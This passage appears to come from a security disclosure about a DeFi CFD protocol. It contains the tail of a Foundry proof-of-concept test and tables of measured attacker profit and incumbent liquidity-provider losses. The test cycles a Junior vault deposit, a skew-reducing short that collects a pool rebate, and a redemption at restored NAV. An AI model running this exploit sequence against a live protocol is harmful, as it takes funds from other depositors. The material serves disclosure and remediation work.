        uint256 shares = juniorVault.claimDeposit(depositRequest, claimable, ATTACKER, ATTACKER);

        // The attacker closes; the lifetime clamp returns the rebate to the pool.
        if (attack) {
            _closeOrder(ATTACKER, CfdTypes.Side.SHORT);
        }
        out.attackerTradingResult = int256(clearinghouse.balanceAssets(ATTACKER)) - int256(attackerTradingStart);

        // After the one-hour cooldown the attacker redeems all its Junior shares at the restored NAV.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _refreshMark(PRICE);
        vm.prank(ATTACKER);
        uint256 redeemRequest = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 redeemStart = juniorVault.depositEpochStart(redeemRequest);
        if (vm.getBlockTimestamp() < redeemStart) {
            vm.warp(redeemStart);
        }
        _refreshMark(PRICE);
        _settleViaRouter();
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemRequest, ATTACKER);
        assertEq(claimableShares, shares, "redemption not funded");
        uint256 before = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemRequest, claimableShares, ATTACKER, ATTACKER);
        out.attackerUsdgFromLp = settlementToken.balanceOf(ATTACKER) - before;
        out.incumbentJuniorValue = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    // --- Router helpers (public V3 path, Pyth mocked) ---

    function _openOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("open", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(KEEPER, orderId, PRICE);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open failed");
    }

    function _closeOrder(
        address account,
        CfdTypes.Side side
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("close", account, ++orderNonce));
        request.side = side;
        (request.sizeDelta,,,,,,) = engine.positions(account);
        request.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(account, orderId, PRICE);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close failed");
    }

    function _settleViaRouter() internal {
        _nextBlock();
        bytes[] memory tick = _ticks(PRICE, vm.getBlockTimestamp(), engine.lastMarkTime());
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
    }

    function _applyReleaseRouterConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeAt(
        address keeper,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 commitTime = router.lifecycleBook().orderTiming(orderId).commitTimestamp;
        uint256 publishTime = uint256(commitTime) + 1;
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        _nextBlock();
        bytes[] memory tick = _ticks(price, publishTime, commitTime);
        vm.prank(keeper);
        result = router.executeOrder(orderId, tick);
    }

    function _ticks(
        uint256 price,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previousPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _nextBlock();
        router.updateMarkPrice(_ticks(price, vm.getBlockTimestamp(), engine.lastMarkTime()));
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

}
```

</details>

### Observed balances:

All amounts are USDG with six decimals. "End to end" rows are the attacker's own money in and out. The control replays the same deposit and redemption from the same snapshot without the skew-reducing trade, isolating the trade's effect.

**Minimum setup, one cycle** (`test_MinimumSetup_OneCycleTakesIncumbentJuniorValue`: 12.5M organic LONG = 25% skew, 10M attacker deposit, 4.5M attacker SHORT)

| Measurement | Control | Attack | Difference |
| --- | ---: | ---: | ---: |
| Pool depth before the cycle | 50,017,624.375024 | 50,017,624.375024 | 0 |
| Pool cash paid out as the open's VPI rebate (the NAV dip) | 0 | 9,221.749449 | +9,221.749449 |
| Attacker Junior deposit | 10,000,000.000000 | 10,000,000.000000 | 0 |
| Attacker Junior redemption claimed | 9,999,634.266868 | 10,004,250.530020 | +4,616.263152 |
| Attacker trading result (execution fees and carry; VPI round trip nets to zero) | 0 | −3,602.420926 | −3,602.420926 |
| Attacker net vs control | — | — | **+1,013.842226** |
| **End to end: attacker money before** (deposit + collateral) | — | 11,000,000.000000 | — |
| **End to end: attacker money after** (redeemed USDG + collateral) | — | 11,000,648.109094 | — |
| **End to end: attacker absolute profit** | — | **+648.109094** | — |
| Incumbent Junior value before the cycle | 9,990,321.923456 | 9,990,321.923456 | 0 |
| Incumbent Junior value after the cycle | 9,989,591.454649 | 9,984,977.412423 | **−4,614.042226** |

**Minimum setup, three cycles** (`test_MinimumSetup_ThreeCyclesCompoundTheIncumbentLoss`)

| Measurement | Control | Attack | Difference |
| --- | ---: | ---: | ---: |
| Incumbent Junior value before the cycles | 9,990,321.923456 | 9,990,321.923456 | 0 |
| Incumbent Junior value after three cycles | 9,988,129.610785 | 9,974,282.853681 | **−13,846.757104** |
| Attacker net over three cycles vs control | — | — | **+3,046.157104** |
| **End to end: attacker absolute profit over three cycles** | — | **+1,948.887526** | — |

**Sensitivity** (`test_Sensitivity`; each row is its own attack and control branch from the same snapshot)

| Organic LONG (skew) | Attacker Junior deposit | Attacker SHORT | Rebate paid out of the pool | Attacker absolute profit | Attacker net vs control | Incumbent Junior loss vs control |
| ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| 12,500,000 (25%) | 10,000,000 | 4,500,000 | 9,221.749449 | +648.109094 | +1,013.842226 | −4,614.042226 |
| 12,500,000 (25%) | 20,000,000 | 6,500,000 | 12,020.762831 | +2,330.238664 | +2,817.801187 | −8,018.001187 |
| 20,000,000 (40%) | 10,000,000 | 12,000,000 | 33,571.800762 | +6,828.067545 | +7,193.355276 | −16,793.555275 |
| 20,000,000 (40%) | 40,000,000 | 15,000,000 | 37,468.527636 | +17,398.420703 | +17,983.132275 | −29,983.332274 |
| 7,750,000 (15.5%, live testnet ratio) | 40,000,000 | 2,750,000 | 3,505.688669 | +20.335174 | +605.444418 | −2,805.644418 |
